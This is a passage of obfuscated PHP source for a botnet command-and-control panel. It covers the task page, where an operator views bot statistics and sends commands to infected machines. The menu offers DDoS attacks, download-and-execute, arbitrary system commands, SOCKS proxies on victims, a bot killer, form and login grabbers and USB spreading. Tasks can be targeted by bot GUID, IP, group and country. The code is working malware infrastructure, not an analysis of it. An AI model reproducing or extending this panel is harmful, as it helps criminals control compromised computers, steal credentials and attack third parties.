                                                                                                                    } else {
                                                                                                                        if (@file_exists($task_path) == true) {
                                                                                                                            require $task_path;
                                                                                                                        }
                                                                                                                        if (2 < strlen($_TASK_COMMAND_STRING)) {
                                                                                                                            $bIsOK = false;
                                                                                                                            if ($es_task_action == "add") {
                                                                                                                                if ($sqlTasks->AddTask($e_task_name, $Session->Get(SESSION_INFO_USERNAME), $_TASK_COMMAND_STRING, $_TASK_EXTENDED_COMMAND_DATA, $e_task_max_bots, $e_task_expiration, $e_task_state, $_TASK_FILE_SQL_TASK_TYPE, $e_task_mask_general_options, $e_task_mask_options, $e_task_os, $e_task_countries, $e_task_groups, $e_task_software, $e_task_hosts, $e_task_guids)) {
                                                                                                                                    $bIsOK = true;
                                                                                                                                }
                                                                                                                            } else {
                                                                                                                                if ($es_task_action == "edit" && $sqlTasks->EditTask($e_task_edit_id, $e_task_name, $_TASK_COMMAND_STRING, $_TASK_EXTENDED_COMMAND_DATA, $e_task_max_bots, $e_task_expiration, $e_task_state, $_TASK_FILE_SQL_TASK_TYPE, $e_task_mask_general_options, $e_task_mask_options, $e_task_os, $e_task_countries, $e_task_groups, $e_task_software, $e_task_hosts, $e_task_guids)) {
                                                                                                                                    $bIsOK = true;
                                                                                                                                }
                                                                                                                            }
                                                                                                                            if ($bIsOK) {
                                                                                                                                $e_task_cmd_string = $_TASK_COMMAND_STRING;
                                                                                                                                $e_task_extended_cmd_data = $_TASK_EXTENDED_COMMAND_DATA;
                                                                                                                                _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_SUCCESS, $es_task_action == "edit" ? TASKS_NOTICE_SUCCESS_EDIT_OK : TASKS_NOTICE_SUCCESS_OK, true, MOD_TASKS_ALERT_WIDTH);
                                                                                                                            } else {
                                                                                                                                _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_NOTICE_ERROR_SQL_ERROR, true, MOD_TASKS_ALERT_WIDTH);
                                                                                                                            }
                                                                                                                        }
                                                                                                                    }
                                                                                                                }
                                                                                                            }
                                                                                                        }
                                                                                                    }
                                                                                                }
                                                                                            }
                                                                                        }
                                                                                    }
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                                if ($e_task_mask_general_options & TASK_GENERAL_OPTION_ALL_BUT_GUIDS) {
                                                    $guid_filter_type_value = "exclude";
                                                }
                                                if ($e_task_mask_general_options & TASK_GENERAL_OPTION_ALL_BUT_IPS) {
                                                    $ip_filter_type_value = "exclude";
                                                }
                                                if ($e_task_mask_general_options & TASK_GENERAL_OPTION_ALL_BUT_GROUPS) {
                                                    $group_filter_type_value = "exclude";
                                                }
                                                if ($e_task_mask_general_options & TASK_GENERAL_OPTION_ALL_BUT_COUNTRIES) {
                                                    $country_filter_type_value = "exclude";
                                                }
                                                if ($es_task_action != "add" && $es_task_action != "edit" && $es_task_action != "viewc") {
                                                    $all_tasks = $sqlTasks->GetTasks();
                                                    $total_num_tasks = @mysql_num_rows($all_tasks);
                                                    $total_num_completed_tasks = 0;
                                                    while ($current_row = mysql_fetch_assoc($all_tasks)) {
                                                        _obfuscated_0D031636073E3F185B305B151F2E105C34400935011D01_($current_row);
                                                        if ($current_row["status"] == TASK_STATUS_FINISHED || $sqlTasks->IsTaskExpired($current_row["expiration_date"])) {
                                                            $total_num_completed_tasks++;
                                                        }
                                                    }
                                                    @mysql_data_seek($all_tasks, 0);
                                                }
                                                $iTotalNoticeCount = 0;
                                                $all_notices = $sqlDefault->Query("SELECT * FROM " . $sqlDefault->pdbname . ".notices LIMIT 4");
                                                if (!isset($bIsMainPage) && $bIsMainPage == false) {
                                                    $all_notices = $sqlDefault->Query("SELECT * FROM " . $sqlDefault->pdbname . ".notices WHERE notice_options & " . NOTICE_OPTION_DISPLAY_IMPORTANT_PAGES . " LIMIT 4");
                                                } else {
                                                    if (isset($bIsMainPage) && $bIsMainPage == true) {
                                                        $all_notices = $sqlDefault->Query("SELECT * FROM " . $sqlDefault->pdbname . ".notices LIMIT 4");
                                                    }
                                                }
                                                $iTotalNoticeCount = @mysql_num_rows($all_notices);
                                                if ($all_notices && 0 < $iTotalNoticeCount) {
                                                    $iNoticeCount = 0;
                                                    while (($current_row = @mysql_fetch_assoc($all_notices)) && $iNoticeCount < 3) {
                                                        if (strtolower($Session->Get(SESSION_INFO_USERNAME)) === strtolower($current_row["notice_target"]) || strlen($current_row["notice_target"]) == 0) {
                                                            $iType = NOTICE_TYPE_INFO;
                                                            if ((int) $current_row["notice_options"] & NOTICE_OPTION_VIEW_AS_RED) {
                                                                $iType = NOTICE_TYPE_ERROR;
                                                            }
                                                            if (@strlen($current_row["notice_author"]) && @strlen($current_row["notice_content"])) {
                                                                $notice_real_text = "<strong>Notice #" . ($iNoticeCount + 1) . " from <i>" . @htmlspecialchars($current_row["notice_author"]) . "</i>:</strong><br />" . @str_replace("\r\n", "<br />", @htmlspecialchars($current_row["notice_content"]));
                                                                $notice_real_text .= "<br />";
                                                                if ((int) $current_row["notice_options"] & NOTICE_OPTION_ALLOW_REMOVE) {
                                                                    $notice_real_text .= "<br />";
                                                                    $notice_real_text .= "<form style=\"display:inline;\" method=\"post\" action=\"" . $_SERVER["REQUEST_URI"] . "\">";
                                                                    $notice_real_text .= "<input type=\"hidden\" name=\"remove_notice_id\" value=\"" . $current_row["id"] . "\">";
                                                                    $notice_real_text .= "<input type=\"submit\" class=\"btn\" name=\"remove_notice_submit\" value=\"Remove notice\">";
                                                                    $notice_real_text .= "</form>";
                                                                }
                                                                _obfuscated_0D292E0A2F3613041D323B1036055B262D0E2928223232_($iType, $notice_real_text, MOD_TASKS_ALERT_WIDTH);
                                                                $iNoticeCount++;
                                                            }
                                                        }
                                                    }
                                                    if ($iNoticeCount == 3 && 4 <= $iTotalNoticeCount) {
                                                        _obfuscated_0D292E0A2F3613041D323B1036055B262D0E2928223232_($iType, "There appears to be more than 3 notices! Please check the <a href=\"?mod=" . MOD_SETTINGS_ALERTS . "\">notices page</a> for additional notices.", 1600);
                                                    }
                                                }
                                                echo "\r\n\r\n<table align=\"center\">\r\n        <thead>\r\n          <tr>\r\n            <th width=\"20%\"></th>\r\n            <th width=\"80%\"></th>\r\n          </tr>\r\n        </thead>\r\n        <tbody>\r\n\t\t<tr>\r\n            <td valign=\"top\">\r\n\t\t\t\t<font size=\"1\" face=\"Tahoma\">\r\n\t\t\t\t<table class=\"table-bordered table-condensed\" align=\"left\">\r\n\t\t\t\t\t\t<thead>\r\n\t\t\t\t\t\t  <tr>\r\n\t\t\t\t\t\t\t<th width=\"250\"></th>\r\n\t\t\t\t\t\t  </tr>\r\n\t\t\t\t\t\t</thead>\r\n\t\t\t\t\t\t<tbody>\r\n\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t<td>\r\n\t\t\t\t\t\t\t\t";
                                                _obfuscated_0D3C1605063C03152930040422062C0F0121150D5C0832_("General statistics", 10, "top: -3px;", "");
                                                _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Botnet", $sqlSettings->Name);
                                                _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Created", date("m/d/Y", $sqlSettings->Created));
                                                _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Version", $sqlSettings->Version);
                                                _obfuscated_0D152C300D16140F2C371E291D062F020D071537162F01_();
                                                echo "\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t<td>\r\n\t\t\t\t\t\t\t\t";
                                                $stats_total_bots = $botsIndex->Stats_GetTotalBots();
                                                $stats_dirty_bots = $botsIndex->Stats_GetTotalDirtyBots();
                                                _obfuscated_0D3C1605063C03152930040422062C0F0121150D5C0832_("Connections", 10, "top: -3px;", "");
                                                _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Total bots", $stats_total_bots);
                                                _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Bots online", $botsIndex->Stats_GetBotsOnline());
                                                _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Bots offline", $botsIndex->Stats_GetBotsOffline());
                                                _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Dirty bots", (string) $stats_dirty_bots . " (" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($stats_dirty_bots, $stats_total_bots) . "%)");
                                                _obfuscated_0D152C300D16140F2C371E291D062F020D071537162F01_();
                                                echo "\t\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t<td>\r\n\t\t\t\t\t\t\t\t";
                                                _obfuscated_0D3C1605063C03152930040422062C0F0121150D5C0832_("Non-task features", 10, "top: -3px;", "");
                                                echo "\t\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t\t<span style=\"float: left\"><a href=\"?mod=";
                                                echo MOD_SETTINGS_PANEL;
                                                echo "&hi=dns\">Domain/IP Modification Settings</a></span><br />\r\n\t\t\t\t\t\t\t\t<span style=\"float: left\"><a href=\"?mod=";
                                                echo MOD_LOGS_FORMS;
                                                echo "\">Form Grabber</a></span><br />\r\n\t\t\t\t\t\t\t\t<span style=\"float: left\"><a href=\"?mod=";
                                                echo MOD_LOGS_LOGINS;
                                                echo "\">Login Grabber</a></span><br />\r\n\t\t\t\t\t\t\t\t<!--<span style=\"float: left\"><a href=\"?mod=";
                                                echo MOD_SETTINGS_DYNAMIC_CONFIG;
                                                echo "\">Manage Dynamic Configuration</a></span><br />-->\r\n\t\t\t\t\t\t\t\t<span style=\"float: left\"><a href=\"?mod=";
                                                echo MOD_SETTINGS_PANEL;
                                                echo "\">USB Spread control</a></span><br />\r\n\t\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t\t";
                                                _obfuscated_0D3C1605063C03152930040422062C0F0121150D5C0832_("Select a task", 10, "top: -3px;", "");
                                                echo "\t\t\t\t\t\t\t\t<span style=\"float: left\"><a href=\"?mod=";
                                                echo MOD_TASKS;
                                                echo "&task_action=add&task=ddos\">DDoS Attack</a></span><br />\r\n\t\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t\t<span style=\"float: left\"><a href=\"?mod=";
                                                echo MOD_TASKS;
                                                echo "&task_action=add&task=dw\">Download / Execute</a></span><br />\r\n\t\t\t\t\t\t\t\t<!--<span style=\"float: left\"><a href=\"?mod=";
                                                echo MOD_TASKS;
                                                echo "&task_action=add&task=up\">Upload file from bot</a></span><br />-->\r\n\t\t\t\t\t\t\t\t<span style=\"float: left\"><a href=\"?mod=";
                                                echo MOD_TASKS;
                                                echo "&task_action=add&task=dw&s=update\">Update bot</a></span><br />\r\n\t\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t\t<span style=\"float: left\"><a href=\"?mod=";
                                                echo MOD_TASKS;
                                                echo "&task_action=add&task=browse&s=visit\">Visit Link</a></span><br />\r\n\t\t\t\t\t\t\t\t<span style=\"float: left\"><a href=\"?mod=";
                                                echo MOD_TASKS;
                                                echo "&task_action=add&task=browse&s=homepage\">Set Browser Homepage</a></span><br />\r\n\t\t\t\t\t\t\t\t<span style=\"float: left\"><a href=\"?mod=";
                                                echo MOD_TASKS;
                                                echo "&task_action=add&task=browse&s=clearcache\">Clear Browser Cookies</a></span><br />\r\n\t\t\t\t\t\t\t\t<!--<span style=\"float: left\"><a href=\"?mod=";
                                                echo MOD_TASKS;
                                                echo "&task_action=add&task=sys\">System Action</a></span><br />-->\r\n\t\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t\t<!--\r\n\t\t\t\t\t\t\t\t<span style=\"float: left\"><a href=\"?mod=";
                                                echo MOD_TASKS;
                                                echo "&task_action=add&task=plugin\">Plugin Command</a></span><br />\r\n\t\t\t\t\t\t\t\t<br />-->\r\n\t\t\t\t\t\t\t\t<span style=\"float: left\"><a href=\"?mod=";
                                                echo MOD_TASKS;
                                                echo "&task_action=add&task=socks\">Run SOCKS Server</a></span><br />\r\n\t\t\t\t\t\t\t\t<span style=\"float: left\"><a href=\"?mod=";
                                                echo MOD_TASKS;
                                                echo "&task_action=add&task=botkill\">Run Bot Killer</a></span><br />\r\n\t\t\t\t\t\t\t\t<span style=\"float: left\"><a href=\"?mod=";
                                                echo MOD_TASKS;
                                                echo "&task_action=add&task=botscript\">Execute BotScript</a></span><br />\r\n\t\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t\t<span style=\"float: left\"><a href=\"?mod=";
                                                echo MOD_TASKS;
                                                echo "&task_action=add&task=sys\">System command</a></span><br />\r\n\t\t\t\t\t\t\t\t<span style=\"float: left\"><a href=\"?mod=";
                                                echo MOD_TASKS;
                                                echo "&task_action=add&task=die\">Terminate until next reboot</a></span><br />\r\n\t\t\t\t\t\t\t\t<span style=\"float: left\"><a href=\"?mod=";
                                                echo MOD_TASKS;
                                                echo "&task_action=add&task=rem\">Uninstall</a></span><br />\r\n\t\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t</tbody>\r\n\t\t\t\t</table>\r\n\t\t\t\t</font>\r\n\t\t\t</td>\r\n\r\n\t\t\t";
                                                $main_task_table_ui_header = "Tasks";
                                                $tasks_completed_percentage = $total_num_completed_tasks ? _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($total_num_completed_tasks, $total_num_tasks) : 0;
                                                if ($es_task_action == "add") {
                                                    $main_task_table_ui_header = "Add Task";
                                                } else {
                                                    if ($es_task_action == "edit") {
                                                        $main_task_table_ui_header = "Edit Task";
                                                    } else {
                                                        if ($es_task_action != "add" && $es_task_action != "edit") {
                                                            $main_task_table_ui_header = "Total tasks - " . $total_num_tasks;
                                                            if (0 < $total_num_tasks) {
                                                                $main_task_table_ui_header .= " (" . $tasks_completed_percentage . "% completed)";
                                                            }
                                                        }
                                                    }
                                                }
                                                echo "\t\t\t<td valign=\"top\">\r\n\t\t\t\t<table class=\"table-bordered table-condensed\" align=\"center\" style=\"width: 1200px;\">\r\n\t\t\t\t<form class=\"task_add\" style=\"display:inline;\" method=\"post\" action=\"";
                                                echo $_SERVER["REQUEST_URI"];
                                                echo "\">\r\n\t\t\t\t\t";
                                                if ($es_task_action != "add" && $es_task_action != "edit" && $es_task_action != "viewc") {
                                                    echo "\t\t\t\t\t\t<thead>\r\n\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t<th width=\"950\" align=\"left\">\r\n\t\t\t\t\t\t\t\t";
                                                    echo $main_task_table_ui_header;
                                                    echo "\r\n\t\t\t\t\t\t\t\t<div class=\"progress progress-success\" style=\"position: relative; top: 7px; width: 750px;\">\r\n\t\t\t\t\t\t\t\t\t<div class=\"bar\" style=\"width: ";
                                                    echo $tasks_completed_percentage;
                                                    echo "%;\"></div>\r\n\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t</th>\r\n\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t</thead>\r\n\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t<td>\r\n\t\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t\t";
                                                    if ($es_task_action != "add" && $es_task_action != "edit" && $es_task_action != "viewc") {
                                                        echo "<font style=\"font-size: 11px; face: font-family: Tahoma;\">";
                                                        echo "<a href=\"" . _obfuscated_0D361335101B2F261B0F053626220415152F332F083222_("&task_ex=clear") . "\">Delete all tasks</a>";
                                                        echo "&nbsp;&nbsp;|&nbsp;&nbsp;";
                                                        echo "<a href=\"" . _obfuscated_0D361335101B2F261B0F053626220415152F332F083222_("&task_ex=clear_finished") . "\">Delete all completed tasks</a>";
                                                        echo "&nbsp;&nbsp;|&nbsp;&nbsp;";
                                                        echo "<a href=\"" . _obfuscated_0D361335101B2F261B0F053626220415152F332F083222_("&task_ex=suspend_all") . "\">Suspend all active tasks</a>";
                                                        echo "&nbsp;&nbsp;|&nbsp;&nbsp;";
                                                        echo "<a href=\"" . _obfuscated_0D361335101B2F261B0F053626220415152F332F083222_("&task_ex=clean_all") . "\">Set dirty bots to clean</a>";
                                                        echo "<span style=\"float: right\"><a href=\"#\" onclick=\"document['export_hidden_socks'].submit()\">Export socks hosts</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a href=\"#\" onclick=\"document['export_hidden_socks_tld'].submit()\">Export socks hosts (With TLD)</a></span></font>";
                                                    }
                                                    echo "\t\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t";
                                                    if (0 < $total_num_exported) {
                                                        echo "\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t<td>\r\n\t\t\t\t\t\t\t";
                                                        $export_file_size = @filesize($pp_export_path);
                                                        $export_file_size_string = "";
                                                        if (1024 < $export_file_size) {
                                                            $export_file_size /= 1024;
                                                            $export_file_size_string = " " . $export_file_size . " kB";
                                                        } else {
                                                            if (0 < $export_file_size) {
                                                                $export_file_size_string = " " . $export_file_size . " byte(s)";
                                                            }
                                                        }
                                                        echo "\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\tDownload exported socks proxies: &nbsp; <a href=\"";
                                                        echo $pp_export_path;
                                                        echo "\">Socks ( ";
                                                        echo "/" . $pp_export_path . " &nbsp;-&nbsp; " . $export_file_size_string;
                                                        echo "&nbsp; - &nbsp;";
                                                        echo $total_num_exported;
                                                        echo " entries )</a>\r\n\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t";
                                                    }
                                                    echo "\t\t\t  ";
                                                }
                                                if ($es_task_action == "add" || $es_task_action == "edit") {
                                                    $_TASK_FILE_UI_ONLY = true;
                                                    if (strlen($task_path)) {
                                                        if (@file_exists($task_path) == false) {
                                                            echo "task page: '" . $task_path . "'<br />\r\n";
                                                            echo "&nbsp;&nbsp;&nbsp;<font color=\"#E80000\">Invalid task specified.</font><br /><br />\r\n&nbsp;&nbsp;&nbsp;<a href=\"javascript:history.go(-1)\">Go back to previous page</a><br /><br />\r\n";
                                                        } else {
                                                            require $task_path;
                                                            echo "\t\t\t  <br />\r\n\t\t\t  <br />\r\n\t\t\t  \r\n\t\t\t  ";
                                                            _obfuscated_0D3C1605063C03152930040422062C0F0121150D5C0832_("Task options", 17, "top: -7px; font-size: 10px; face: font-family: Tahoma;", "left: 2px");
                                                            echo "\t\t\t  \r\n\t\t\t\t<table>\r\n\t\t\t\t\t<tbody>\r\n\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\r\n\t\t\t\t\t\t\t\t<span style=\"font-size: 11px; face: font-family: Tahoma; position: relative; top: -5px;\">Task name: </span>\r\n\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\r\n\t\t\t\t\t\t\t\t<input type=\"text\" class=\"span3\" name=\"task_name\" value=\"";
                                                            echo $e_task_name;
                                                            echo "\" style=\"position: relative; top: -1px; width: 240px; height: 10px; font-size: 10px; face: font-family: Tahoma; ";
                                                            echo $task_name_error;
                                                            echo "\">\r\n\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\r\n\t\t\t\t\t\t\t\t<span style=\"font-size: 11px; face: font-family: Tahoma; position: relative; top: -5px;\">Maximum bots to execute task:&nbsp;&nbsp;</span>\r\n\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\r\n\t\t\t\t\t\t\t\t<input type=\"text\" class=\"span3\" name=\"task_max_bots\" value=\"";
                                                            echo $e_task_max_bots;
                                                            echo "\" style=\"position: relative; top: -1px; width: 70px; height: 10px; font-size: 10px; face: font-family: Tahoma; ";
                                                            echo $task_max_bots_error;
                                                            echo "\">\r\n\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\r\n\t\t\t\t\t\t\t\t<span style=\"font-size: 11px; face: font-family: Tahoma; position: relative; top: -6px;\">Expiration date for task: </span>\r\n\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t\t";
                                                            if (!isset($e_expiration_date_string) || strlen($e_expiration_date_string) < 4) {
                                                                $current_date = date("m/d/Y", time() + 86400 * 5);
                                                            } else {
                                                                $current_date = $e_expiration_date_string;
                                                            }
                                                            echo "\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\r\n\t\t\t\t\t\t\t\t<div class=\"input-append date\" id=\"dp3\" data-date-format=\"mm/dd/yyyy\" data-date=\"";
                                                            echo $current_date;
                                                            echo "\">\r\n\t\t\t\t\t\t\t\t\t<input class=\"span2\" size=\"16\" type=\"text\" value=\"";
                                                            echo $current_date;
                                                            echo "\" name=\"task_exp_date\" style=\"position: relative; top: -5px; width: 90px; height: 10px; font-size: 10px; face: font-family: Tahoma;  ";
                                                            echo $task_exp_date_error;
                                                            echo "\" readonly>\r\n\t\t\t\t\t\t\t\t<span class=\"add-on\" style=\"height: 10px; position: relative; top: -5px; \"><i class=\"icon-th\" style=\"position: relative; top: -2px; \"></i></span>\r\n\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t</tbody>\r\n\t\t\t  </table>\r\n\t\t\t  <br />\r\n\t\t\t  \r\n\t\t\t  \r\n\t\t\t<table class=\"table-bordered\" style=\"width: 900px; height: 80px; background-color: #FAFAFA; position: relative; top: -7px;\">\r\n\t\t\t\t<tr>\r\n\t\t\t\t\t<td width=\"99%\">\r\n\t\t\t\t\t\t<span style=\"position: relative; left: 6px; font-size: 11px; face: font-family: Tahoma;\">\r\n\t\t\t\t  <div style=\"font-size: 10px; face: font-family: Tahoma;\">\r\n\t\t\t\t\t<span style=\"font-size: 11px; face: font-family: Tahoma;\"><strong>Initial task state:</strong></span>\r\n\t\t\t\t\t<br />\r\n\t\t\t\t\t<span style=\"position: relative; top: 2px; font-size: 11px; face: font-family: Tahoma;\">\r\n\t\t\t\t\t<input type=\"radio\" name=\"task_status\" value=\"active\" ";
                                                            echo $e_task_state == TASK_STATUS_ACTIVE ? "checked" : "";
                                                            echo ">&nbsp;&nbsp;Active<br />\r\n\t\t\t\t\t<input type=\"radio\" name=\"task_status\" value=\"suspended\" ";
                                                            echo $e_task_state == TASK_STATUS_SUSPENDED ? "checked" : "";
                                                            echo ">&nbsp;&nbsp;Suspended<br />\r\n\t\t\t\t\t</span>\r\n\t\t\t\t  </div>\r\n\t\t\t\t\t\t</span>\r\n\t\t\t\t\t</td>\r\n\t\t\t\t</tr>\r\n\t\t\t</table>\r\n\r\n\t\t\t  <br />\r\n\t\t\t  <br />\r\n\r\n\t\t\t  ";
                                                            _obfuscated_0D3C1605063C03152930040422062C0F0121150D5C0832_("Individual targeting:", 17, "top: -7px; font-size: 10px; face: font-family: Tahoma;", "left: 2px");
                                                            echo "\t\t\t  \r\n\t\t\t  <div class=\"control-group\">\r\n\t\t\t  <label style=\"font-size: 10px; face: font-family: Tahoma\">Apply task only to these Bot GUIDs (Example: &lt;GUID_1&gt;, &lt;GUID_2&gt;, ..):</label>\r\n\t\t\t\t<label class=\"control-label\" for=\"textarea\"></label>\r\n\t\t\t\t<div class=\"controls\">\r\n\t\t\t\t  <textarea class=\"input-xlarge\" id=\"textarea\" rows=\"1\" name=\"task_guids\" style=\"width: 800px; ";
                                                            echo $task_guids_error;
                                                            echo "\">";
                                                            echo $e_task_guids;
                                                            echo "</textarea>\r\n\t\t\t\t</div>\r\n\t\t\t  </div>\r\n\t\t\t\t<div style=\"position: relative; top: -9px; font-size: 11px; face: font-family: Tahoma\">\r\n\t\t\t\t\t<input type=\"radio\" name=\"guid_filter_type\" value=\"include\" ";
                                                            echo $guid_filter_type_value == "include" ? "checked" : "";
                                                            echo ">&nbsp;Apply to these GUIDs only\r\n\t\t\t\t\t&nbsp;&nbsp;&nbsp;&nbsp;\r\n\t\t\t\t\t<input type=\"radio\" name=\"guid_filter_type\" value=\"exclude\" ";
                                                            echo $guid_filter_type_value == "exclude" ? "checked" : "";
                                                            echo ">&nbsp;Exclude these GUIDs\r\n\t\t\t\t</div>\r\n\t\t\t\t<br />\r\n\r\n\t\t\t  <div class=\"control-group\">\r\n\t\t\t  <label style=\"font-size: 10px; face: font-family: Tahoma\">Apply task only to bots with these IP(s) (Example: 127.0.0.1, 10.0.0.2, ..):</label>\r\n\t\t\t\t<label class=\"control-label\" for=\"textarea\"></label>\r\n\t\t\t\t<div class=\"controls\">\r\n\t\t\t\t  <textarea class=\"input-xlarge\" id=\"textarea\" rows=\"1\" name=\"task_hosts\" style=\"width: 800px; ";
                                                            echo $task_hosts_error;
                                                            echo "\">";
                                                            echo $e_task_hosts;
                                                            echo "</textarea>\r\n\t\t\t\t</div>\r\n\t\t\t  </div>\r\n\t\t\t\t<div style=\"position: relative; top: -9px; font-size: 11px; face: font-family: Tahoma\">\r\n\t\t\t\t\t<input type=\"radio\" name=\"ip_filter_type\" value=\"include\" ";
                                                            echo $ip_filter_type_value == "include" ? "checked" : "";
                                                            echo ">&nbsp;Apply to these IPs only\r\n\t\t\t\t\t&nbsp;&nbsp;&nbsp;&nbsp;\r\n\t\t\t\t\t<input type=\"radio\" name=\"ip_filter_type\" value=\"exclude\" ";
                                                            echo $ip_filter_type_value == "exclude" ? "checked" : "";
                                                            echo ">&nbsp;Exclude these IPs\r\n\t\t\t\t</div>\r\n\t\t\t\t<br />\r\n\t\t\t\t\r\n\t\t\t  <div class=\"control-group\">\r\n\t\t\t  <label style=\"font-size: 10px; face: font-family: Tahoma\">Apply task only to bots in these group(s) (Example: group1, somegroup2, ..):</label>\r\n\t\t\t\t<label class=\"control-label\" for=\"textarea\"></label>\r\n\t\t\t\t<div class=\"controls\">\r\n\t\t\t\t  <textarea class=\"input-xlarge\" id=\"textarea\" rows=\"1\" name=\"task_groups\" style=\"width: 800px; ";
                                                            echo $task_groups_error;
                                                            echo "\">";
                                                            echo $e_task_groups;
                                                            echo "</textarea>\r\n\t\t\t\t</div>\r\n\t\t\t  </div>\r\n\t\t\t\t<div style=\"position: relative; top: -9px; font-size: 11px; face: font-family: Tahoma\">\r\n\t\t\t\t\t<input type=\"radio\" name=\"group_filter_type\" value=\"include\" ";
                                                            echo $group_filter_type_value == "include" ? "checked" : "";
                                                            echo ">&nbsp;Apply to these groups only\r\n\t\t\t\t\t&nbsp;&nbsp;&nbsp;&nbsp;\r\n\t\t\t\t\t<input type=\"radio\" name=\"group_filter_type\" value=\"exclude\" ";
                                                            echo $group_filter_type_value == "exclude" ? "checked" : "";
                                                            echo ">&nbsp;Exclude these groups\r\n\t\t\t\t</div>\r\n\t\t\t\t<br />\r\n\t\t\t  \r\n\t\t\t";
                                                            $tmp_task_countries = isset($e_task_countries) ? $e_task_countries : "";
                                                            $should_use_locale_filter = true;
                                                            $num_geo_records = $sqlGeoIP->GetGeoRecordsCount();
                                                            if ($num_geo_records < 55000) {
                                                                $should_use_locale_filter = false;
                                                            }
                                                            if ($should_use_locale_filter == false) {
                                                                echo "<font color=\"#E80000\" style=\"font-size: 11px; face: font-family: Tahoma\">The GeoIP database does not appear to be completely loaded. An incomplete or unavailable GeoIP database will not allow the server to determine what country each client is from. You should not use targeted regions until GeoIP data is fully loaded.</font><br />";
                                                            }
                                                            echo "\t\t\t  \r\n\t\t\t<div class=\"control-group\">\r\n\t\t\t\t\r\n\t\t\t\t<label style=\"font-size: 11px; face: font-family: Tahoma\">Countries task applies to (Example: RU, KZ, DE ...):</label>\r\n\t\t\t\t<label class=\"control-label\" for=\"textarea\"></label>\r\n\t\t\t\t<div class=\"controls\">\r\n\t\t\t\t\t<textarea class=\"input-xlarge\" id=\"textarea\" rows=\"1\" name=\"task_countries\" style=\"width: 800px;\">";
                                                            echo $tmp_task_countries;
                                                            echo "</textarea>\r\n\t\t\t\t</div>\r\n\t\t\t</div>\r\n\t\t\t<div style=\"position: relative; top: -9px; font-size: 11px; face: font-family: Tahoma\">\r\n\t\t\t\t<input type=\"radio\" name=\"country_filter_type\" value=\"include\" ";
                                                            echo $country_filter_type_value == "include" ? "checked" : "";
                                                            echo ">&nbsp;Apply to these countries only\r\n\t\t\t\t&nbsp;&nbsp;&nbsp;&nbsp;\r\n\t\t\t\t<input type=\"radio\" name=\"country_filter_type\" value=\"exclude\" ";
                                                            echo $country_filter_type_value == "exclude" ? "checked" : "";
                                                            echo ">&nbsp;Exclude these countries\r\n\t\t\t</div>\r\n\t\t\t  \r\n\t\t\t  <br />\r\n\t\t\t  <br />\r\n\t\t\t  \r\n\t\t\t  ";
